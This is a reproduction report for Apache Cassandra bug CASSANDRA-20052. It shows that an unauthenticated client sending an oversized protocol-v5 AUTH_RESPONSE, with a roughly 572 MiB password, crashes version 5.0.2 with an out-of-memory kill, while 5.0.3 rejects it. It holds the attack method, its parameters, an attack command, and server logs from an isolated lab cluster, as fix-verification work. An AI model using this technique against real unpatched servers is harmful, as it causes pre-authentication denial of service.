# CASSANDRA-20052 — Reproduction Evidence

**Bug:** "Size of CQL messages is not limited in V5 protocol logic"
**Buggy version:** cassandra:5.0.2  |  **Fixed-control:** cassandra:5.0.3 (fixVersions include 4.1.8, 5.0.3, 6.0; 5.0 ceiling=8 so 5.0.3 control is valid)
**Component:** Messaging/Client  |  **Namespace:** repro-20052  |  **Disposition: REPRODUCED**

## Reproducer extracted from Jira body (ground truth)
The V5 native-protocol framing path is enabled right after the AUTH stage, and the only size guard
(`native_transport_max_frame_size`, 16MiB) applies only to pre-V5 sessions / the initial STARTUP/OPTIONS
messages — it is NOT checked in any V5 logic. Therefore an *unauthenticated* client can send a huge
`AUTH_RESPONSE` (the Jira example: a 500,000,000-char password) over protocol v5. The server tries to
buffer/decode the whole message, exhausting heap -> `OutOfMemoryError` / GC death / process kill = pre-auth DoS.
The fix (PR #3655, shipped in 5.0.3) adds `native_transport_max_message_size` and
`native_transport_max_auth_message_size` (default 128KiB) to reject oversized (auth) messages.

Classifier hint (topology=1node, trigger="V5: send huge AUTH_RESPONSE/CQL message -> memory pressure / GC death / DoS")
matches the body. **tag_correction: none.**

## Topology
Single Cassandra pod per version on the existing kind cluster (context kind-kind), pinned to node
kind-worker3 (where I imported the images), namespace `repro-20052`. A separate lightweight `client` pod
(8Gi mem) ran the attack so client-side allocation of the 572MiB string would not be confused with the
server-side OOM. Both server pods: `authenticator: PasswordAuthenticator` (so AUTH_RESPONSE is actually
exchanged), heap pinned small via `MAX_HEAP_SIZE=512M` / `-Xmx512M` to make the OOM cheap & deterministic.

## Load generator (V5-capable — the blocking question, resolved)
The cassandra image bundles `cassandra-driver-internal-only-3.29.0.zip` (DataStax python driver 3.29.0,
supports ProtocolVersion.V5=5). Confirmed importable inside the pod via the zip subpath
`/opt/cassandra/lib/cassandra-driver-internal-only-3.29.0.zip/cassandra-driver-3.29.0`. The attack forces
`protocol_version=ProtocolVersion.V5` so the oversized AUTH_RESPONSE goes through the buggy V5 framing path
(NOT the v4 path which is bounded by native_transport_max_frame_size). Script /tmp/repro-20052-attack.py:
connects with username='cassandra', password='-'*600_000_000 (≈572 MiB) -> emits a 600000015-byte AUTH_RESPONSE.

## Config corroboration (kubectl exec, not docker)
buggy 5.0.2 cassandra.yaml — count of `native_transport_max_auth_message_size|native_transport_max_message_size`:
    0      (the new size-limit params are ABSENT in the buggy version; only `# native_transport_max_frame_size: 16MiB` present)

## BUGGY RUN (cassandra:5.0.2)  — THE BUG FIRES
Baseline before attack: server responsive, `release_version 5.0.2`, restartCount=0.

Attack client output:
    [attack] target = 10.244.1.73 password length = 600000000 bytes (~572 MiB)
    [attack] EXCEPTION: NoHostAvailable :: ('Unable to connect to any servers', {'10.244.1.73:9042': ConnectionShutdown('Connection to 10.244.1.73:9042 was closed')})

Server log (system.log) — the V5 framing OOM, VERBATIM:
    ERROR [epollEventLoopGroup-5-14] 2026-06-12 03:32:11,922 JVMStabilityInspector.java:186 - Force heap space OutOfMemoryError in the presence of
    java.lang.OutOfMemoryError: Cannot reserve 131081 bytes of direct buffer memory (allocated: 536796132, limit: 536870912)
    	at java.base/java.nio.Bits.reserveMemory(Unknown Source)
    	at java.base/java.nio.DirectByteBuffer.<init>(Unknown Source)
    	at java.base/java.nio.ByteBuffer.allocateDirect(Unknown Source)
    	at org.apache.cassandra.utils.memory.BufferPool.allocate(BufferPool.java:238)
    	at org.apache.cassandra.utils.memory.BufferPool$LocalPool.get(BufferPool.java:923)
    	at org.apache.cassandra.utils.memory.BufferPool$LocalPool.getAtLeast(BufferPool.java:901)
    	at org.apache.cassandra.utils.memory.BufferPool.getAtLeast(BufferPool.java:219)
    	at org.apache.cassandra.net.BufferPoolAllocator.getAtLeast(BufferPoolAllocator.java:75)
    	at org.apache.cassandra.net.FrameDecoder.stash(FrameDecoder.java:336)
    	at org.apache.cassandra.net.FrameDecoderWith8bHeader.decode(FrameDecoderWith8bHeader.java:131)
    	at org.apache.cassandra.net.FrameDecoderCrc.decode(FrameDecoderCrc.java:150)
    	at org.apache.cassandra.net.FrameDecoder.channelRead(FrameDecoder.java:283)
    ...
    java.lang.OutOfMemoryError: Java heap space
    Dumping heap to java_pid1.hprof ...
    Unable to create java_pid1.hprof: Permission denied
    #
    # java.lang.OutOfMemoryError: Java heap space
    # -XX:OnOutOfMemoryError="kill -9 %p"
    #   Executing /bin/sh -c "kill -9 1"...

=> Unauthenticated 572MiB AUTH_RESPONSE drove the 512M-heap server to `OutOfMemoryError: Java heap space`
   via the V5 frame decode path (FrameDecoder.stash / FrameDecoderCrc.decode), and the JVM's
   OnOutOfMemoryError handler executed `kill -9 1` against the Cassandra process (PID 1) = DoS. This is
   exactly the CASSANDRA-20052 mechanism. (Cassandra JVM is PID1 with -Xmx512M -XX:OnOutOfMemoryError=kill -9 %p.)

## CONTROL RUN (cassandra:5.0.3, fixed) — IDENTICAL ATTACK, NO BUG
Attack client output (same 572MiB password):
    [attack] target = 10.244.1.80 password length = 600000000 bytes (~572 MiB)
    [attack] EXCEPTION: NoHostAvailable :: ('Unable to connect to any servers', {'10.244.1.80:9042': ConnectionShutdown('Connection to 10.244.1.80:9042 was closed')})

Server log — graceful size rejection, NO OOM:
    WARN [epollEventLoopGroup-5-12] 2026-06-12 03:35:03,395 NoSpamLogger.java:107 - Protocol exception with client networking: The connection is not yet in a valid state to process multi frame CQL Messages, usually thismeans that authentication is still pending. type = AUTH_RESPONSE, size = 600000015

Verification of contrast:
- Actual thrown `java.lang.OutOfMemoryError: Java heap space` events (excluding the boot banner / JVM-args line):
    buggy 5.0.2:  PRESENT (multiple), plus JVMStabilityInspector force-OOM + `kill -9 1`
    control 5.0.3: NONE  (the only 2 grep hits are boot-time noise: a `CompileCommand: exclude ...forceHeapSpaceOomMaybe` directive and the `JVM Arguments: [... -XX:OnOutOfMemoryError=kill -9 %p ...]` banner)
- After the identical attack the control 5.0.3 stayed fully responsive:
    kubectl exec cass3 -- cqlsh -u cassandra -p cassandra -e "SELECT now() FROM system.local"
     system.now()
     --------------------------------------
     c75c17c0-660f-11f1-81d3-c19dcc42ce04
    (1 rows)
  restartCount=0, ready=true.

## Conclusion
REPRODUCED. The buggy 5.0.2 has no V5 message-size limit: an unauthenticated client's oversized
AUTH_RESPONSE (600000015 bytes) exhausts the heap and triggers a forced OutOfMemoryError + `kill -9` of the
server process (pre-auth DoS). The 5.0.3 fix rejects the same oversized AUTH_RESPONSE at the framing layer
("type = AUTH_RESPONSE, size = 600000015") and the server survives and stays responsive. Clean A/B.

## Commands (key)
- import image: docker save cassandra:5.0.2 -o t.tar; docker cp t.tar kind-worker3:/root/; docker exec kind-worker3 ctr -n k8s.io images import /root/t.tar
- deploy buggy: kubectl apply -f /tmp/repro-20052-buggy.yaml  (pod cass, ns repro-20052, 5.0.2, PasswordAuthenticator, -Xmx512M, nodeSelector worker3)
- deploy ctl:   kubectl apply -f /tmp/repro-20052-ctl.yaml    (pod cass3, 5.0.3, same)
- client pod:   cassandra:5.0.2 sleeping, 8Gi mem, runs /tmp/attack.py <serverIP> 600000000 via bundled v5 driver
- attack:       kubectl exec -n repro-20052 client -- python3 /tmp/attack.py <IP> 600000000
